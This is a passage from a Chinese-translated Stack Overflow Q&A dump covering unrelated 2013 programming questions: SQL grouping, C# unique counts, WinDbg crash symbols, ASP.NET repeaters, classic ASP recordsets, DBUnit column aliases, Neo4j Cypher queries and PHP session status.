在最后一行，您可以阅读“Stramenopiles”。其结果是一个简单的计数。现在我想编写一个 bash 脚本，该脚本不仅为 Stramenopiles 还为该列中的所有条目写入计数 - 不是总和，而是每个分隔的条目。我需要将它与 bash 中的迭代循环结合起来，但我以前从未编写过脚本。有人可以帮我弄这个吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:20:19.227

我根本不会在 bash 中这样做。如果你删除

```
where t1.taxon_list = 'Stramenopiles' 
```

您可以`group by myt_taxon_list`在外部选择中使用 a

```
select myt_taxon_list, count(myt_taxon_list)
from (select t1.taxon_list as myt_taxon_list, t1.query_prot_id,
             count(t1.query_prot_id) / (select count(t.id)
                                        from taxa t, stax st
                                        where t.systematics like concat('%; ', st.taxon_list, '%')
                                              and t.taxon_name not like '%thaliana%'
                                              and st.taxon_list = t1.taxon_list
                                        group by t1.taxon_list) as taxfrac
      from task1 t1
      group by t1.query_prot_id, t1.taxon_list) myt 
where taxfrac > 0.5
group by myt_taxon_list 
```

它为您提供了所有`taxon_list`条目的精确计算。

# php - 通过函数返回循环返回什么

> ID：15159055
> 
> 赞同：-2
> 
> 时间：2013-03-01T13:34:55.853
> 
> 标签：php

我目前正在尝试遍历函数的返回，但我只是无法弄清楚如何做到这一点。这有点像 Wordpress 循环：while (have_posts())。

这就是我想要做的，但是我的函数必须返回什么才可以循环？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T13:39:50.423

你只是问`have_posts()`在这种情况下会返回什么？

它不是“一个可循环的函数”，它只是一个函数。它没有任何迹象表明循环。在这种情况下，它被*用作*循环的条件：

```
while (have_posts()) 
```

循环条件需要一个`while`布尔值。将语句想象为“当这个条件为真时，继续循环”。所以在这种情况下`have_posts()`应该返回一个布尔值，真或假。

只要函数返回`true`，循环就会继续。一旦它返回`false`，循环就会结束。函数本身对此没有内部知识。它只是被一遍又一遍地调用（每次循环迭代）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:40:38.850

如果我理解得很好（您的问题不是很清楚），您可以从函数内部返回一个数组，然后执行“foreach”循环：

```
function num($arg) {
    return array (1, 2, 3, 4);
}

foreach (num($var) as $number) {
    ...
} 
```

# c# - 我想通过输入文本文件在 C# 中返回唯一值计数

> ID：15159056
> 
> 赞同：0
> 
> 时间：2013-03-01T13:34:57.907
> 
> 标签：c#, regex, collections

假设有这样的行：

> 英格兰 A 队队员：Flintoff
> 英格兰 A 队队员：Flintoff
> 英格兰 B 队队员：施特劳斯
> 英格兰 A 队队员：施特劳斯
> 印度队队员 A：Sachin Tendulkar
> 印度队队员 B：Sachin Tendulkar
> 印度队队员 A：Javagal Srinath

现在我想要的是搜索并返回唯一值计数，例如如果我想搜索英格兰球员的唯一计数，它应该给我 2，如上例所示。

我尝试过的代码，但不起作用：

```
string searchKeyword = "England";
string fileName = @"C:\Users\karansha\Desktop\search tab.txt";
string[] textLines = File.ReadAllLines(fileName);
List<string> results = new List<string>();
foreach (string line in textLines)
{
    if (line.Contains(searchKeyword))
    {
        results.Add(line);
    }
}
List<string> users = new List<string>();
Regex regex = new Regex(@"player:\s*(?<playername>.*?)\s+appGUID");
MatchCollection matches = regex.Matches(searchKeyword);
foreach (Match match in matches)
{
    var user = match.Groups["username"].Value;
    if  (!users.Contains(user)) users.Add(user);
}
int numberOfUsers = users.Count;
Console.WriteLine(numberOfUsers);
// keep screen from going away
// when run from VS.NET
Console.ReadLine(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:41:20.190

A simpler way would be to use LINQ:

```
string searchKeyword = "England";
string fileName = @"C:\Users\renan.stigliani\Desktop\search tab.txt";
string[] textLines = File.ReadAllLines(fileName);

int numberOfUsers = textLines
                        .Where(x => x.Contains(searchKeyword))
                        .Distinct()
                        .Count();

Console.WriteLine(numberOfUsers);

// keep screen from going away
// when run from VS.NET
Console.ReadLine(); 
```

As noted by @DominicKexel I swept the foreach

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:43:27.700

可能听起来有点简单，但你为什么不从你的列表中选择不同的？例子：

```
string searchKeyword = "England";
string fileName = @"C:\Users\karansha\Desktop\search tab.txt";
string[] textLines = File.ReadAllLines(fileName);
List<string> results = new List<string>();
foreach (string line in textLines)
{
    if (line.Contains(searchKeyword))
    {
        results.Add(line);
    }
}
List<string> users = results.Distinct().toList(); 
```

那会给你独特的线条，你需要分裂，你可以很容易地做到这一点。你可以知道有多少独特的计数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:44:07.723

如果您不喜欢 Regex 方法，您可以将值（例如“England player: Foo”）添加到 Dictionary 对象，使值成为键，这样就不会添加重复项，然后使用 Count 方法。另请参见**ContainsKey**方法。

[http://msdn.microsoft.com/en-us/library/xfhwa508.aspx](http://msdn.microsoft.com/en-us/library/xfhwa508.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T13:44:09.930

1.  您需要检查您的列表是否已经包含关键字
2.  使用字典集合。
3.  你不需要那个正则表达式的东西。

* * *

```
string searchKeyword = "England";
string fileName = @"C:\Users\karansha\Desktop\search tab.txt";
string[] textLines = File.ReadAllLines(fileName);
Dictionary<string,int> results = new Dictionary<string,int>;
foreach (string line in textLines)
{
    if (line.Contains(searchKeyword))
    {
        if(results.Keys.Any(searchKeyword))
        {
            results[searchKeyword]++;
        }
        else
        {
            results.Add(searchKeyword,1);
        }
        results.Add(line);
    }
}

foreach(var item in results)
{
    Console.WriteLine("Team:"+item.Key +"\nPlayer Count:"+item.Value);
} 
```

# windbg - 获取使用 exe、pdb 和 windbg 日志调用的函数的名称（未加载符号）

> ID：15159060
> 
> 赞同：0
> 
> 时间：2013-03-01T13:35:14.427
> 
> 标签：windbg

我已经花了一整天的时间，但无法加载符号。windbg 中的堆栈跟踪仍然显示我的应用程序的十六进制地址，并且无法验证我的 exe 的校验和。

我有十六进制地址、windbg 日志、exe 和 pdb 文件。我不能手动找出最后一个调用的函数吗？

如果您有兴趣，这里是日志：-

```
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for vrfcore.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for combase.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for oleaut32.dll - 
*** WARNING: Unable to verify checksum for MYapp.exe
*** ERROR: Module load completed but symbols could not be loaded for MYapp.exe
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for user32.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for appcore.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for appengine.dll - 
***** OS symbols are WRONG. Please fix symbols to do analysis.

*************************************************************************
***                                                                   ***
***                                                                   ***
***    Either you specified an unqualified symbol, or your debugger   ***
***    doesn't have full symbol information.  Unqualified symbol      ***
***    resolution is turned off by default. Please either specify a   ***
***    fully qualified symbol module!symbolname, or enable resolution ***
***    of unqualified symbols by typing ".symopt- 100". Note that   ***
***    enabling unqualified symbol resolution with network symbol     ***
***    server shares in the symbol path may cause the debugger to     ***
***    appear to hang for long periods of time when an incorrect      ***
***    symbol name is typed or the network symbol server is down.     ***
***                                                                   ***
***    For some commands to work properly, your symbol path           ***
***    must point to .pdb files that have full type information.      ***
***                                                                   ***
***    Certain .pdb files (such as the public OS symbols) do not      ***
***    contain the required information.  Contact the group that      ***
***    provided you with these symbols if you need this command to    ***
***    work.                                                          ***
***                                                                   ***
***    Type referenced: ntdll!_PEB                                    ***
***                                                                   ***
*************************************************************************
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for kernel32.dll - 
*************************************************************************
***                                                                   ***
***                                                                   ***
***    Either you specified an unqualified symbol, or your debugger   ***
***    doesn't have full symbol information.  Unqualified symbol      ***
***    resolution is turned off by default. Please either specify a   ***
***    fully qualified symbol module!symbolname, or enable resolution ***
***    of unqualified symbols by typing ".symopt- 100". Note that   ***
***    enabling unqualified symbol resolution with network symbol     ***
***    server shares in the symbol path may cause the debugger to     ***
***    appear to hang for long periods of time when an incorrect      ***
***    symbol name is typed or the network symbol server is down.     ***
***                                                                   ***
***    For some commands to work properly, your symbol path           ***
***    must point to .pdb files that have full type information.      ***
***                                                                   ***
***    Certain .pdb files (such as the public OS symbols) do not      ***
***    contain the required information.  Contact the group that      ***
***    provided you with these symbols if you need this command to    ***
***    work.                                                          ***
***                                                                   ***
***    Type referenced: nt!IMAGE_NT_HEADERS32                         ***
***                                                                   ***
*************************************************************************
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ole32.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for KERNELBASE.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for mswsock.dll - 

FAULTING_IP: 
ntdll!RtlpNtMakeTemporaryKey+2467
7748a947 eb11            jmp     ntdll!RtlpNtMakeTemporaryKey+0x247a (7748a95a)

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 7748a947 (ntdll!RtlpNtMakeTemporaryKey+0x00002467)
   ExceptionCode: c0000374
  ExceptionFlags: 00000001
NumberParameters: 1
   Parameter[0]: 7749e1e8

DEFAULT_BUCKET_ID:  WRONG_SYMBOLS

PROCESS_NAME:  MYapp.exe

ADDITIONAL_DEBUG_TEXT:  
You can run '.symfix; .reload' to try to fix the symbol path and load symbols.

FAULTING_MODULE: 773b0000 ntdll

DEBUG_FLR_IMAGE_TIMESTAMP:  50108a69

ERROR_CODE: (NTSTATUS) 0xc0000374 - A heap has been corrupted.

EXCEPTION_CODE: (NTSTATUS) 0xc0000374 - A heap has been corrupted.

EXCEPTION_PARAMETER1:  7749e1e8

APP:  myapp.exe

PRIMARY_PROBLEM_CLASS:  WRONG_SYMBOLS

BUGCHECK_STR:  APPLICATION_FAULT_WRONG_SYMBOLS

LAST_CONTROL_TRANSFER:  from 7748bbff to 7748a947

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0072b7b4 7748bbff c0000374 7749e1e8 0072b7f8 ntdll!RtlpNtMakeTemporaryKey+0x2467
0072b7c4 7748ac55 00000002 97dca43f 03d30000 ntdll!RtlpNtMakeTemporaryKey+0x371f
0072b7f8 77425b89 00000008 03d30000 082a15e8 ntdll!RtlpNtMakeTemporaryKey+0x2775
0072b82c 6ff9a6df 03d30000 00000000 082a15f0 ntdll!RtlCreateUserThread+0x4549
0072b844 771b3da8 03d30000 00000000 082a15f0 vrfcore!VerifierSetAPIClassName+0x116
0072b858 7539d0cc 772bd7c8 082a15f0 082a15f0 combase!CoGetMalloc+0x570
0072b874 753344cc 00000010 75334490 082a15f4 oleaut32!VarFormatFromTokens+0x15a25
0072b888 00ed41ad 082a15f4 e198556c 0072b9b8 oleaut32!SysFreeString+0x3c
0072b988 00edad3f 0072b9b4 0072b9f4 06a97188 MYapp+0x141ad
0072bb1c 00ee00f7 06502f40 0072be08 e19857ac MYapp+0x1ad3f
0072bb48 00ecb4a8 0072bb78 0072be08 e1985740 MYapp+0x200f7
0072bba4 00ee0902 0072be94 0072be08 e198571c MYapp+0xb4a8
0072bbf8 00ec87b8 05c9a530 e19850fc 00000000 MYapp+0x20902
0072bc18 00edccb3 0072be08 e198508c 0000000a MYapp+0x87b8
0072bc68 00edc98f 0072bdec e198509c 05c9964c MYapp+0x1ccb3
0072bf0c 00ec5dc7 0072c044 e1982de4 0072c264 MYapp+0x1c98f
0072c100 757477d8 002a020c 0000c1be 00000000 MYapp+0x5dc7
0072c12c 757478cb 00ec5af0 002a020c 0000c1be user32!gapfnScSendMessage+0x4e0
0072c1a8 7574f139 00ec5af0 00ec5af0 00000000 user32!gapfnScSendMessage+0x5d3
0072c210 7574aaa6 04819c60 00000000 0000c1be user32!PostMessageA+0x15e
0072c23c 6ee5b057 002a020c 0000c1be 00000000 user32!SendMessageW+0x52
....

STACK_COMMAND:  ~0s; .ecxr ; kb

FOLLOWUP_IP: 
oleaut32!VarFormatFromTokens+15a25
7539d0cc e98573f9ff      jmp     oleaut32!VariantInit+0xb46 (75334456)

SYMBOL_STACK_INDEX:  6

SYMBOL_NAME:  oleaut32!VarFormatFromTokens+15a25

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: oleaut32

IMAGE_NAME:  oleaut32.dll

BUCKET_ID:  WRONG_SYMBOLS

FAILURE_BUCKET_ID:  WRONG_SYMBOLS_c0000374_oleaut32.dll!VarFormatFromTokens
--------- 
```

将符号路径添加到包含 Myapp.pdb 的目录后重新加载 /f 的 o/p

```
0:000> !sym noisy; .reload /f MYApp.exe
noisy mode - symbol prompts on
DBGHELP: none - file not found
*** WARNING: Unable to verify checksum for MYapp.exe
*** ERROR: Module load completed but symbols could not be loaded for MYapp.exe
DBGHELP: MYapp - no symbols loaded 
```

# c# - 如何从下拉列表的 selectedchanged 事件中获取位于中继器项目中的控件的值，该事件位于同一中继器项目中？

> ID：15159062
> 
> 赞同：2
> 
> 时间：2013-03-01T13:35:17.333
> 
> 标签：c#, asp.net, repeater

```
<ItemTemplate>
   <tr class="odd gradeX">
      <td>
         <%#Eval("Caption")%>
      </td>
      <td>
         <%#Eval("CreatedBy")%>
      </td>
      <td>
         <%#Eval("CreationDate")%>
      </td>
      <td>
         <%#Eval("Status")%>
      </td>
      <td class="center">
         <div class="controls center">
            <a href="NewsCommentEdit.aspx?mtid =<%#Eval("UserId")%>" title="Güncelle" class="tip">
               <span class="icon12 icomoon-icon-pencil"></span>
            </a>
         </div>
      </td>
      <td>
         <asp:HiddenField runat="server" ID="hdnComment" Value='<%#Eval("NewsCommentId")%>' />
         <asp:DropDownList runat="server" ID="ddlStatus" AutoPostBack="True"  OnSelectedIndexChanged="ddlStatus_Changed">
            <asp:ListItem Text="Onay Bekliyor" Value="0"></asp:ListItem>
            <asp:ListItem Text="Onaylandı" Value="1"></asp:ListItem>
            <asp:ListItem Text="Reddedildi" Value="2"></asp:ListItem>
         </asp:DropDownList>
      </td>
   </tr>
</ItemTemplate> 
```

我想在 ddlStatus 的选定索引更改事件中获取 hdnComment 的值。这可能吗？怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:49:34.847

```
 protected void ddlStatus_Changed(object sender, EventArgs e) 
    {
        string value;
        HiddenField comment = ((Control)sender).Parent.FindControl("hdnComment") as HiddenField;
        if (comment != null) 
        {
            value = comment.Value;
        }
    } 
```

# asp.net - 如果您想在 ASP.NET 4.5 中使用实例名称 mssqlserver2 连接到 SQLServerExpress，连接字符串在 web.config 中的外观应该如何？

> ID：15159063
> 
> 赞同：1
> 
> 时间：2013-03-01T13:35:20.270
> 
> 标签：asp.net, connection-string, sql-server-express

我有一个 mssqlserver2 的 SQLServerExpress 的命名实例

首先是计算机名称：

```
w7\mssqlserver2 
```

但是，如果您想将 SQLExpress 连接到该服务器，那么连接字符串在 web.config 中的外观应该如何呢？

这是用于登录控件的，因此它可以创建这些表。

```
<!-- Not working connstring -->
<add name="DefaultConnection" providerName="System.Data.SqlClient" connectionString="Data Source=.\SQLEXPRESS;Initial Catalog=aspnet-Site-20130227161535;Integrated Security=SSPI" /> 
```

错误混乱>

“/”应用程序中的服务器错误。

*建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。*

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T13:41:49.297

尝试以下

```
<add name="DefaultConnection" providerName="System.Data.SqlClient" connectionString="Data Source=w7\mssqlserver2;Initial Catalog=YOUR_DATABASE;Integrated Security=SSPI" /> 
```

# java - 为什么java中tcp/ip消息字节数组的最后一个元素是0？

> ID：15159066
> 
> 赞同：0
> 
> 时间：2013-03-01T13:35:25.660
> 
> 标签：java

我正在从客户端向服务器发送一个字节数组。客户端的字节数组是：

```
0 52 2 0 72 3c 5 80 0 c0 0 8 10 c 22 38 4e 5b 15 1f 29 1e 0 0 0 0 0 0 a 0 b 16 21 2c 37 c
22 38 20 41 62 2 1c 11 1 0 15 4 2c 0 30 30 30 30 30 30 30 31 30 30 30 30 30 30 30 30 30
30 30 30 30 31 35 0 9 4d 79 20 50 61 72 73 65 72 
```

但是服务器收到的字节数组是：

```
0 52 2 0 72 3c 5 80 0 c0 0 8 10 c 22 38 4e 5b 15 1f 29 1e 0 0 0 0 0 0 a 0 b 16 21 2c 37 c
22 38 20 41 62 2 1c 11 1 0 15 4 2c 0 30 30 30 30 30 30 30 31 30 30 30 30 30 30 30 30 30
30 30 30 30 31 35 0 9 4d 79 20 50 61 72 73 65 0 
```

请尽快让我知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:37:34.793

您没有提供任何代码，这使得诊断变得困难，但我*怀疑*您忽略了`InputStream.read()`指示已读取多少字节的返回值。

消息完全有可能被网络分解，您需要发出多次`read()`调用才能全部获取。您应该注意返回值`read()`并忽略相关范围之外的任何字节。

当然，要么是这样，要么您实际上没有正确发送数据，这可能是由于一个错误的错误。再次 - 没有代码，很难说。

# asp-classic - asp中的记录集并在asp中执行存储过程

> ID：15159067
> 
> 赞同：3
> 
> 时间：2013-03-01T13:35:27.007
> 
> 标签：asp-classic, ado

我想在按钮上从一个 .asp 页面打开另一个 .asp 页面，单击下面是我已经完成的代码，但错误即将到来

错误是“**对象关闭时不允许操作**”

这是代码

```
 Dim dbconn, objCmd, objParam, rs, EmailID, Password, connString, RecordCount

 connString = "Connectionstring"

 dbconn = Server.CreateObject("ADODB.Connection")

 dbconn.Open(connString)

 rs = Server.CreateObject("ADODB.RecordSet")

 objCmd = Server.CreateObject("ADODB.Command")
 objCmd.ActiveConnection = dbconn
 objCmd.CommandText = "sp_Name"
 objCmd.CommandType = &H0004 
 objParam = objCmd.CreateParameter("@EmailID",200,1,"100",Session("EmailID"))
 objCmd.Parameters.Append(objParam)

  objParam = objCmd.CreateParameter("@Password",200,1,"100",Session("Password"))
  objCmd.Parameters.Append(objParam)

   rs = objCmd.Execute(Session("EmailID"),Session("Password"))

   do while not rs.eof ------->here comes error 

    EmailID = rs(0)
    Password =  rs(1)
    'response.Write EmailID & "," & Password & "<br">
    rs.MoveNext
loop 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:07:48.133

试试下面的代码。

```
SET rs = objCmd.Execute(Session("EmailID"),Session("Password")) 
```

在 rs 之前添加 SET

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-20T19:05:04.623

这是我的建议。

就我而言，Command.Execute() 中的 RecordSet 对象不支持 .BOF 或 EOF。

所以，我使用 RecordSet.Open 方法来调用这样的存储过程......

```
Dim dbconn, objCmd, objParam, rs, EmailID, Password, connString, RecordCount
connString = "Connectionstring"
dbconn = Server.CreateObject("ADODB.Connection")
dbconn.Open(connString)

rs = Server.CreateObject("ADODB.RecordSet")

objCmd = Server.CreateObject("ADODB.Command")
objCmd.ActiveConnection = dbconn
objCmd.CommandText = "sp_Name"
objCmd.CommandType = &H0004 
objParam = objCmd.CreateParameter("@EmailID",200,1,"100",Session("EmailID"))
objCmd.Parameters.Append(objParam)
objParam = objCmd.CreateParameter("@Password",200,1,"100",Session("Password"))
objCmd.Parameters.Append(objParam)

rs.Open objCmd, dbconn, 1, 1

do while not rs.eof ------->here comes error 
    EmailID = rs(0)
    Password =  rs(1)
    'response.Write EmailID & "," & Password & "<br">
    rs.MoveNext
loop 
```

我希望还不算太晚！！

# mysql - 从查询创建数据集时，DBUnit 忽略列别名？

> ID：15159085
> 
> 赞同：2
> 
> 时间：2013-03-01T13:36:07.393
> 
> 标签：mysql, dbunit

我有两个数据集，我想与 DBUnit 进行比较：一个定义为 XML 文件，另一个我正在尝试使用查询创建：

```
dbConnection.createQueryTable("my_table", "SELECT ..."); 
```

Select 遍历了几个表，其中少数具有相同的列名，因此我使用别名来区分它们。查询运行良好，但似乎在创建数据集时，DBUnit 忽略了列别名并改用原始名称。这在 DEBUG 日志中可以清楚地看到：

```
01.03.13 14:18:43,228 [ DEBUG] AbstractDatabaseConnection - createQueryTable(resultName=my_table, sql=
        SELECT `table1`.`name`
            , `table2`.`label` AS `table2_label`
            , `table3`.`label`
        FROM `table1`
            , `table2`
            , `table3`
        WHERE `table1`.`id` = `table2`.`table1_id`
            AND `table2`.`id` = `table3`.`table2_id`
    ) - start
01.03.13 14:18:43,228 [ DEBUG] DatabaseDataSourceConnection - getConnection() - start
01.03.13 14:18:43,228 [ DEBUG] DatabaseConfig$Configurator - Statement fetch size set to 100
01.03.13 14:18:43,240 [ DEBUG] DatabaseDataSourceConnection - getConnection() - start
01.03.13 14:18:43,240 [ DEBUG] DatabaseTableMetaData - The 'schemaName' from the ResultSetMetaData is empty-string and not applicable hence. Will not try to lookup column properties via DatabaseMetaData.getColumns.
01.03.13 14:18:43,240 [ DEBUG] DatabaseTableMetaData - The 'schemaName' from the ResultSetMetaData is empty-string and not applicable hence. Will not try to lookup column properties via DatabaseMetaData.getColumns.
01.03.13 14:18:43,240 [ DEBUG] DatabaseTableMetaData - The 'schemaName' from the ResultSetMetaData is empty-string and not applicable hence. Will not try to lookup column properties via DatabaseMetaData.getColumns.
01.03.13 14:18:43,240 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=0, columnName=name) - start
01.03.13 14:18:43,240 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=0, columnName=label) - start
01.03.13 14:18:43,240 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=0, columnName=label) - start
01.03.13 14:18:43,240 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=1, columnName=name) - start
01.03.13 14:18:43,241 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=1, columnName=label) - start
01.03.13 14:18:43,241 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=1, columnName=label) - start
01.03.13 14:18:43,241 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=2, columnName=name) - start
01.03.13 14:18:43,241 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=2, columnName=label) - start
01.03.13 14:18:43,241 [ DEBUG] ForwardOnlyResultSetTable - getValue(row=2, columnName=label) - start 
```

如您所见 -`getValue(row=X)`用作和列`label`的名称，而不是在查询中定义的和...`table2``table3``table2_label``label`

如何解决这个问题？我正在使用 MySQL 数据库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-16T08:12:22.600

这看起来像是由[MYSQL Java 连接器的更改引起的](http://bugs.mysql.com/bug.php?id=21596)

由`DatabaseTableMetaData`调用`ResultSetMetaData#getColumnName()`而不是引起`#getColumnLabel()`

您没有说明您使用的是哪个版本的 DBUnit/MySql，但 DBUnit 2.2 和 2.4.9 会受到 MySql 连接器 5.1.26 的影响。

作为一种解决方法，MySQL 开发人员包含了一个向后兼容性选项，在上面的更改中进行了讨论。

要对其进行配置，请向您的 JDBC url 添加一个属性：

`jdbc:mysql://host/db_name?useOldAliasMetadataBehavior=true`

按照[这些说明](http://dev.mysql.com/doc/refman/5.0/en/connector-j-reference-configuration-properties.html)。

# jquery - jQuery在每个之前检查数组的长度？

> ID：15159096
> 
> 赞同：0
> 
> 时间：2013-03-01T13:36:46.823
> 
> 标签：jquery

快速提问，我需要`.length`下面的 if 语句吗？

```
var $colspans = $("td[colspan='0']");
if($colspans.length){
    $colspans.each(function(){ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T13:38:02.737

不，如果为零，`.each`则根本不会运行。`.length`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:38:29.847

不，如果`$colspans`长度为 0，那么 .each 将不会被执行。不会抛出任何错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:38:30.873

不，你不需要它。 `.each`仅在满足条件时才有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T13:38:36.617

不，因为`length`will 是 0 而不是 that `$colspans`will be `null`，所以你没有试图无所事事地打电话的危险。它只是不会迭代，因为没有什么*可以*迭代的。

# java - 网络环境下的Java应用

> ID：15159099
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:00.840
> 
> 标签：java, mysql, percona

我正在使用 Java 和 MySQL 数据库开发应用程序，该应用程序是在网络环境中工作的桌面应用程序。应用程序有一些在启动应用程序时从数据库加载的静态内容。如果超级用户对某些变量进行了一些更改，我需要强制网络用户重新启动应用程序，以便他们可以加载新变量。

我需要使用什么想法或代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:41:09.657

我不明白你真正需要做什么。但我通常做的是告诉用户，这些更改只有在应用程序重新启动时才会生效。之后，用户负责重新启动应用程序。如果您想自动执行此操作，您只需要在更改数据时刷新更改的数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:45:06.737

该用例有很多解决方案。我会为您的对象设置时间戳。当管理员更改该对象时，时间戳将在服务器端更新为当前日期。将对象交付给客户端后，客户端必须将接收到的对象与客户端当前使用的对象进行比较。如果时间戳不相等，您可以显示警告对话框。如果您拥有该解决方案很容易实现的架构......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:47:08.070

你可以实现这样的东西。

[观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)

或者，也许您可​​以在数据库中有一个“ConfigTable”，其中包含属性、值、到期时间。

因此，当管理员更新某个值时，网络中的其他应用程序可以汇集新值。

[看看 JGroups](http://www.jgroups.org/)

关于池化方法，（我们没有足够的信息来为您提供最佳解决方案）您可以尝试这样的方法。

带有 ID、事件的通知表（事件是您知道的，可能会加载新图像等）

工作流程

1）客户端每隔 X 秒从该表池中过滤一次，过滤 ID > lastNotificationId（需要保存在本地文件中） 2）客户端应用新事件。3）客户端用新的notificationId更新本地文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T13:47:19.860

为什么不将数据存储在可以覆盖值的容器中？这样您就不必重新启动应用程序，只需即时刷新数据。

这样，您可以重新定义 a `MessageBundle`、 a`Properties`或用于存储数据的任何容器对象的内容。

# neo4j - 如何使用密码查询检索具有多个关系的节点

> ID：15159100
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:00.933
> 
> 标签：neo4j, cypher

有人可以帮我解决这个问题。

我正在使用密码查询来获取与“hive”或“hadoop”有关系的节点，并且我能够获取这些节点。

但是当我尝试获取具有“hive”和“hadoop”关系的节点时，我无法获取节点。

这是我正在使用的查询

开始 n=node(*) 匹配 (n)-[r]-() 其中 type(r)="Hadoop" 和 type(r)="hive" 返回 n,count(n);

此查询返回 0 行。

我的查询是错误的还是我需要以其他方式进行。

提前致谢。

古斯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:02:26.977

这应该这样做：

```
start n=node(*) match ()-[:Hadoop]-(n)-[:hive]-() return n,count(n) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T13:51:57.343

我认为您的查询应该是：

> 开始 n=node(*) 匹配 (n)-[r1]-(),(n)-[r2]-() 其中 type(r1)="Hadoop" 和 type(r2)="hive" 返回 n，计数（n）；

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-14T13:19:53.950

你可以像这样实现它

```
match (n)-[r:Hadoop|hive]-()
return n,count(n); 
```

它将为您提供您所期望的。最好在 match 中设置条件，而不是在 where 子句中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-04-25T15:10:32.757

首先，您的查询没有结果的原因是因为该部分`where type(r)="Hadoop" and type(r)="hive"`说您正在寻找 r 的实例，其中 r.type = "Hadoop" 和 "hive" 同时。由于 r.type 在任何时候只能有一个值，它不可能同时等于 Hadoop 和 Hive；因此该语句可以在逻辑上简化为“where false”或基本上删除所有匹配项。

如果您正在寻找具有任何一种关系的所有节点，那么[Satish Shinde 的答案](https://stackoverflow.com/a/29049394/6893866)是指定它的正确方法

```
match (n)-[:Hadoop|hive]-()
return n,count(n); 
```

或者，有方向

```
match (n)-[:Hadoop|hive]->()
return n,count(n); 
```

如果您需要两者都存在，则需要匹配两个单独的关系边缘，如下所示

```
match ()-[:hive]-(n)-[:Hadoop]-()
return n,count(n); 
```

或者，有方向

```
match ()<-[:hive]-(n)-[:Hadoop]->()
return n,count(n); 
```

为了完整起见，如果您想检查两者都存在于哪里，您可以使用[remigio 的答案](https://stackoverflow.com/a/15159363/6893866)

```
start n=node(*) match ()-[r2]-(n)-[r1]-() where type(r1)="Hadoop" and type(r2)="hive" return n,count(n); 
```

# php - 检查写入会话是否被阻止

> ID：15159103
> 
> 赞同：1
> 
> 时间：2013-03-01T13:37:09.453
> 
> 标签：php, session

PHP 提供功能[`session_write_close`](http://php.net/manual/en/function.session-write-close.php)。我想检查会话是否已关闭。`session_id()`仍然返回值。

```
session_start();

//
// Some code there
//

session_write_close();

//
// Some code there
//

if( /*is session write closed?*/)
    echo 'Session closed';
else
    echo 'Session still opened'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:14:55.907

所有你需要的是

```
session_start();
session_write_close();
var_dump(sessionStatus()); // this would return false 
```

和

```
session_start();
var_dump(sessionStatus()); // true 
```

使用的功能

```
function sessionStatus() {
    if (function_exists('session_status')) {
        return (session_status() == PHP_SESSION_ACTIVE);
    }
    return defined('SID');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:47:06.770

如果你有 PHP 5.4.0 或更高版本，你可以使用[session_status()](http://www.php.net/manual/en/function.session-status.php)。

# android - android xml中第二个元素之上的一个元素

> ID：15159106
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:10.887
> 
> 标签：android, android-layout

我的布局有一个小问题。这是代码：

```
<?xml version="1.0" encoding="utf-8"?>
